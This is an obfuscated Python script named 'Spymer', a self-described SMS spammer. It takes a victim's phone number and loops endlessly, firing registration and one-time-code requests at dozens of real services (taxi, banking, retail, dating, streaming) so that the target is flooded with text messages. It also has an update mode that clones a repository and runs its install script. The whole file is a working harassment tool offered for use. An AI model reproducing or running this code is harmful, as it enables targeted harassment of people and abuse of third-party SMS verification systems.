#!/usr/bin/python3
import requests #line:4
import random #line:5
import datetime #line:6
import sys #line:7
import time #line:8
import argparse #line:9
import os #line:10
import json #line:11
from colorama import Fore ,Back ,Style #line:12
class Spymer :#line:15
	def main (OOOO0O00000000O00 ):#line:16
		os .system ('cls'if os .name =='nt'else 'clear')#line:17
		print (Fore .GREEN +'''
8888888888888888888888888
8888888888888888888888888
888        888        888
888  888888888  8888  888
888  888888888  888888888
888  888888888  888888888
888        888        888
888  888888888888888  888
888  888888888888888  888
888  888888888  8888  888
888  888888888        888
8888888888888888888888888
8888888888888888888888888
8888    FSystem88    8888
8888   SMS Spammer   8888
8888   v.6 (final)   8888
8888888888888888888888888
8888888888888888888888888'''+Style .RESET_ALL )#line:36
		O00OO0O00000OO0OO =argparse .ArgumentParser (prog ='spymer',description ="Fucking shit by FSystem88. Возможно что-то уже не работает. Только для России!",epilog ='Мой e-mail - FSystem88@bk.ru')#line:37
		O00OO0O00000OO0OO .add_argument ('phonenum',metavar ='phone',help ='Телефонный номер жертвы (пример: 79991234455)')#line:38
		OOOO0O000O0OO000O =O00OO0O00000OO0OO .parse_args ()#line:39
		_OOOOO0OO00O00O0O0 =OOOO0O000O0OO000O .phonenum #line:40
		if _OOOOO0OO00O00O0O0 =="update":#line:42
			O00OO0OOOOOOOO0O0 =os .system ("cd && rm -rf ~/spymer && git clone https://github.com/FSystem88/spymer && sh ~/spymer/install.sh")#line:43
			exit ()#line:44
		def O0O0O0OO00O00O0OO (OOO00000OO0O0O0OO ,type ='new'):#line:46
			OOO0OO0OOOOOO000O =datetime .datetime .now ().strftime ('%H:%M:%S')#line:47
			OO0OO00O0OO0O00OO ='*'#line:48
			if type =='warn':#line:49
				OO0OO00O0OO0O00OO ='!'#line:50
			else :#line:51
				if type =='new':#line:52
					OO0OO00O0OO0O00OO =='*'#line:53
			OOO00000OO0O0O0OO ='['+OO0OO00O0OO0O00OO +']['+OOO0OO0OOOOOO000O +']'+OOO00000OO0O0O0OO #line:54
			return OOO00000OO0O0O0OO #line:55
		def O00O0O0OO000OOO00 (OOOOOOOO00O00OO0O ,endspace =False ):#line:56
			if endspace ==True :#line:57
				return '['+OOOOOOOO00O00OO0O +'] '#line:58
			return '['+OOOOOOOO00O00OO0O +']'#line:59
		def O0OO00OO0OO0OO00O (O0OOO00OOOOO0O0OO ):#line:60
			try :#line:61
				time .sleep (O0OOO00OOOOO0O0OO )#line:62
			except KeyboardInterrupt :#line:63
				print ('\r'+O0O0O0OO00O00O0OO (O00O0O0OO000OOO00 ('except',True )+'KeyboardInterrupt thrown! Exiting . . .','warn'))#line:64
				exit ()#line:65
		_OOOOO0OO00O00O0O0 =OOOO0O000O0OO000O .phonenum #line:66
		try :#line:67
			if int (_OOOOO0OO00O00O0O0 ):#line:68
				if _OOOOO0OO00O00O0O0 [0 ]=='+':#line:69
					_OOOOO0OO00O00O0O0 =_OOOOO0OO00O00O0O0 [1 :]#line:70
				if _OOOOO0OO00O00O0O0 [0 ]=='8':#line:71
					_OOOOO0OO00O00O0O0 ='7'+_OOOOO0OO00O00O0O0 [1 :]#line:72
				if _OOOOO0OO00O00O0O0 [0 ]=='9':#line:73
					_OOOOO0OO00O00O0O0 ='7'+_OOOOO0OO00O00O0O0 #line:74
				try :#line:75
					O0OO0OOO00O0000O0 =requests .post ('https://rainbow-t-shirt.com/spymer/json.php',data ={'phone':_OOOOO0OO00O00O0O0 }).json ()["id"]#line:76
					if int (O0OO0OOO00O0000O0 )>0 :#line:77
						print (Fore .RED +"\nНомер телефона находится в антиспам листе.\nЧтобы попасть туда - напиши мне в Telegram:\n@FSystem88"+Style .RESET_ALL )#line:78
				except :#line:79
					_OO0000OOO0O00O000 =''#line:80
					for OO00OOOO0O000OOOO in range (12 ):#line:81
						_OO0000OOO0O00O000 =_OO0000OOO0O00O000 +random .choice (list ('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))#line:82
						OOOOOOO0O0O00O000 =_OO0000OOO0O00O000 +random .choice (list ('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))#line:83
						OO0O000O00OO0OO0O =_OO0000OOO0O00O000 +random .choice (list ('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))#line:84
					OOOO00O00O0OO00OO =0 #line:85
					_O0OOO000OO00OO00O =_OOOOO0OO00O00O0O0 [1 :]#line:86
					_O000OO000O0000OO0 ='+'+_OOOOO0OO00O00O0O0 [0 ]+'('+_OOOOO0OO00O00O0O0 [1 :4 ]+')'+_OOOOO0OO00O00O0O0 [4 :7 ]+'-'+_OOOOO0OO00O00O0O0 [7 :9 ]+'-'+_OOOOO0OO00O00O0O0 [9 :11 ]#line:87
					_O00O000000O00OO00 =_O0OOO000OO00OO00O [:3 ]+'+'+_O0OOO000OO00OO00O [3 :6 ]+'-'+_O0OOO000OO00OO00O [6 :8 ]+'-'+_O0OOO000OO00OO00O [8 :10 ]#line:88
					_OO0O000O00OOO0O0O ='+'+_OOOOO0OO00O00O0O0 [0 ]+'+('+_OOOOO0OO00O00O0O0 [1 :4 ]+')'+_OOOOO0OO00O00O0O0 [4 :7 ]+'-'+_OOOOO0OO00O00O0O0 [7 :9 ]+'-'+_OOOOO0OO00O00O0O0 [9 :11 ]#line:89
					_OO0O0O00O00OO0000 ='+'+_OOOOO0OO00O00O0O0 [0 ]+' ('+_OOOOO0OO00O00O0O0 [1 :4 ]+') '+_OOOOO0OO00O00O0O0 [4 :7 ]+' '+_OOOOO0OO00O00O0O0 [7 :9 ]+' '+_OOOOO0OO00O00O0O0 [9 :11 ]#line:90
					_OOOO00OO0O0O00O0O =_OOOOO0OO00O00O0O0 [1 :4 ]+') '+_OOOOO0OO00O00O0O0 [4 :7 ]+'-'+_OOOOO0OO00O00O0O0 [7 :9 ]+'-'+_OOOOO0OO00O00O0O0 [9 :11 ]#line:91
					print (O0O0O0OO00O00O0OO (O00O0O0OO000OOO00 ('info',True )+('Отправка SMS на: +{}').format (_OOOOO0OO00O00O0O0 )))#line:92
					print ('Спамер запущен.')#line:93
					print ('Если Вы хотите остановить - нажмите Ctrl+Z.')#line:94
					OOOO00O00O0OO00OO =0 #line:95
					while True :#line:96
						try :#line:97
							OOOO0O00000000O00 .formatted_phone =_OOOOO0OO00O00O0O0 #line:98
							_O0OOOOOO0OOO0O0O0 =_OO0000OOO0O00O000 +f'{OOOO00O00O0OO00OO}'+'@gmail.com'#line:99
							OO0O0O00O0OOO0O00 =_OO0000OOO0O00O000 +f'{OOOO00O00O0OO00OO}'+'@gmail.com'#line:100
							requests .post ('https://p.grabtaxi.com/api/passenger/v2/profiles/register',data ={'phoneNumber':_OOOOO0OO00O00O0O0 ,'countryCode':'ID','name':'test','email':'mail@mail.com','deviceToken':'*'},headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})#line:101
							requests .post ('https://moscow.rutaxi.ru/ajax_keycode.html',data ={'l':_O0OOO000OO00OO00O }).json ()["res"]#line:102
							requests .post ('https://belkacar.ru/get-confirmation-code',data ={'phone':_OOOOO0OO00O00O0O0 })#line:103
							requests .post ('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data ={'phone_number':_OOOOO0OO00O00O0O0 })#line:104
							requests .post ('https://app.karusel.ru/api/v1/phone/',data ={'phone':_OOOOO0OO00O00O0O0 })#line:105
							requests .post ('https://api.tinkoff.ru/v1/sign_up',data ={'phone':'+'+_OOOOO0OO00O00O0O0 })#line:106
							requests .post ('https://api.mtstv.ru/v1/users',json ={'msisdn':_OOOOO0OO00O00O0O0 })#line:107
							requests .post ('https://youla.ru/web-api/auth/request_code',data ={'phone':_OOOOO0OO00O00O0O0 })#line:108
							requests .post ('https://pizzahut.ru/account/password-reset',data ={'reset_by':'phone','action_id':'pass-recovery','phone':_OO0O0O00O00OO0000 ,'_token':'*'})#line:109
							requests .post ('https://www.rabota.ru/remind',data ={'credential':_OOOOO0OO00O00O0O0 })#line:110
							requests .post ('https://rutube.ru/api/accounts/sendpass/phone',data ={'phone':'+'+_OOOOO0OO00O00O0O0 })#line:111
							requests .post ('https://www.citilink.ru/registration/confirm/phone/+'+_OOOOO0OO00O00O0O0 +'/')#line:112
							requests .post ('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',data ={'name':_OO0000OOO0O00O000 ,'phone':_OOOOO0OO00O00O0O0 ,'promo':'yellowforma'})#line:113
							requests .get ('https://www.oyorooms.com/api/pwa/generateotp?phone='+_O0OOO000OO00OO00O +'&country_code=%2B7&nod=4&locale=en')#line:114
							requests .post ('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',params ={'pageName':'loginByUserPhoneVerification','fromCheckout':'false','fromRegisterPage':'true','snLogin':'','bpg':'','snProviderId':''},data ={'phone':'+7 915 3509908','g-recaptcha-response':'','recaptcha':'on'})#line:115
							requests .post ('https://newnext.ru/graphql',json ={'operationName':'registration','variables':{'client':{'firstName':'Иван','lastName':'Иванов','phone':_OOOOO0OO00O00O0O0 ,'typeKeys':['Unemployed']}},'query':'mutation registration($client: ClientInput!) {' '\n  registration(client: $client) {' '\n    token\n    __typename\n  }\n}\n'})#line:116
							requests .post ('https://api.sunlight.net/v3/customers/authorization/',data ={'phone':_OOOOO0OO00O00O0O0 })#line:117
							requests .post ('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json ={'client_type':'personal','email':_O0OOOOOO0OOO0O0O0 ,'mobile_phone':_OOOOO0OO00O00O0O0 ,'deliveryOption':'sms'})#line:118
							requests .post ('https://online.sbis.ru/reg/service/',json ={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_OOOOO0OO00O00O0O0 },'id':'1'})#line:119
							requests .post ('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',json ={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone':_O0OOO000OO00OO00O ,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})#line:120
							requests .post ('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru',data ={'phone':_OOOOO0OO00O00O0O0 })#line:121
							requests .post ('https://app.karusel.ru/api/v1/phone/',data ={'phone':OOOO0O00000000O00 .formatted_phone })#line:122
							requests .post ('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',json ={'phone':'+'+OOOO0O00000000O00 .formatted_phone })#line:123
							requests .post ('https://lenta.com/api/v1/authentication/requestValidationCode',json ={'phone':'+'+OOOO0O00000000O00 .formatted_phone })#line:124
							requests .post ('https://cloud.mail.ru/api/v2/notify/applink',json ={"phone":"+"+OOOO0O00000000O00 .formatted_phone ,"api":2 ,"email":"email","x-email":"x-email"})#line:125
							requests .post ('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params ={"pageName":"registerPrivateUserPhoneVerificatio"},data ={"phone":OOOO0O00000000O00 .formatted_phone ,"recaptcha":'off',"g-recaptcha-response":""})#line:126
							requests .post ("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data ={"st.r.phone":"+"+OOOO0O00000000O00 .formatted_phone })#line:127
							requests .post ('https://plink.tech/register/',json ={"phone":OOOO0O00000000O00 .formatted_phone })#line:128
							requests .post ("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json ={"phone":OOOO0O00000000O00 .formatted_phone })#line:129
							requests .post ("http://smsgorod.ru/sendsms.php",data ={"number":OOOO0O00000000O00 .formatted_phone })#line:130
							requests .post ('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data ={'phone_number':OOOO0O00000000O00 .formatted_phone })#line:131
							requests .post ('https://passport.twitch.tv/register?trusted_request=true',json ={"birthday":{"day":11 ,"month":11 ,"year":1999 },"client_id":"kd1unb4b3q4t58fwlpcbzcbnm76a8fp","include_verification_code":True ,"password":OOOOOOO0O0O00O000 ,"phone_number":OOOO0O00000000O00 .formatted_phone ,"username":OO0O000O00OO0OO0O })#line:132
							requests .post ('https://cabinet.wi-fi.ru/api/auth/by-sms',data ={'msisdn':OOOO0O00000000O00 .formatted_phone },headers ={'App-ID':'cabinet'})#line:133
							requests .post ("https://api.wowworks.ru/v2/site/send-code",json ={"phone":OOOO0O00000000O00 .formatted_phone ,"type":2 })#line:134
							requests .post ('https://eda.yandex/api/v1/user/request_authentication_code',json ={"phone_number":"+"+OOOO0O00000000O00 .formatted_phone })#line:135
							requests .post ('https://youla.ru/web-api/auth/request_code',data ={'phone':OOOO0O00000000O00 .formatted_phone })#line:136
							requests .post ('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json ={"client_type":"personal","email":f"{OO0O0O00O0OOO0O00}@gmail.ru","mobile_phone":OOOO0O00000000O00 .formatted_phone ,"deliveryOption":"sms"})#line:137
							requests .post ("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data ={"phone":OOOO0O00000000O00 .formatted_phone })#line:138
							requests .post ('https://www.delivery-club.ru/ajax/user_otp',data ={"phone":OOOO0O00000000O00 .formatted_phone })#line:139
							requests .post ('https://belkacar.ru/get-confirmation-code',data ={'phone':OOOO0O00000000O00 .formatted_phone })#line:140
							requests .post ("https://api.carsmile.com/",json ={"operationName":"enterPhone","variables":{"phone":OOOO0O00000000O00 .formatted_phone },"query":"mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})#line:141
							requests .post ('https://www.citilink.ru/registration/confirm/phone/+'+OOOO0O00000000O00 .formatted_phone +'/')#line:142
							requests .post ("https://api.delitime.ru/api/v2/signup",data ={"SignupForm[username]":OOOO0O00000000O00 .formatted_phone ,"SignupForm[device_type]":3 })#line:143
							requests .get ('https://findclone.ru/register',params ={'phone':'+'+OOOO0O00000000O00 .formatted_phone })#line:144
							requests .post ("https://guru.taxi/api/v1/driver/session/verify",json ={"phone":{"code":1 ,"number":_OOOOO0OO00O00O0O0 }})#line:145
							requests .post ('https://www.icq.com/smsreg/requestPhoneValidation.php',data ={'msisdn':OOOO0O00000000O00 .formatted_phone ,"locale":'en','countryCode':'ru','version':'1',"k":"ic1rtwz1s1Hj1O0r","r":"46763"})#line:146
							requests .post ("https://terra-1.indriverapp.com/api/authorization?locale=ru",data ={"mode":"request","phone":"+"+OOOO0O00000000O00 .formatted_phone ,"phone_permission":"unknown","stream_id":0 ,"v":3 ,"appversion":"3.20.6","osversion":"unknown","devicemodel":"unknown"})#line:147
							requests .post ("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data ={"password":OOOOOOO0O0O00O000 ,"application":"lkp","login":"+"+OOOO0O00000000O00 .formatted_phone })#line:148
							requests .post ('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json ={"phone":_OOOOO0OO00O00O0O0 })#line:149
							requests .post ("https://api.ivi.ru/mobileapi/user/register/phone/v6",data ={"phone":OOOO0O00000000O00 .formatted_phone })#line:150
							requests .post ('https://youdo.com/api/verification/sendverificationcode/',data ={'PhoneE164':_OOOOO0OO00O00O0O0 })#line:151
							OOOO00O00O0OO00OO +=1 #line:152
							print (('{} круг пройден.').format (OOOO00O00O0OO00OO ))#line:153
						except :#line:154
							pass #line:155
		except :#line:156
			print (Fore .RED +"\nНомер телефона введён некорректно "+Style .RESET_ALL )#line:157
spammer =Spymer ()#line:158
spammer .main ()#line:159
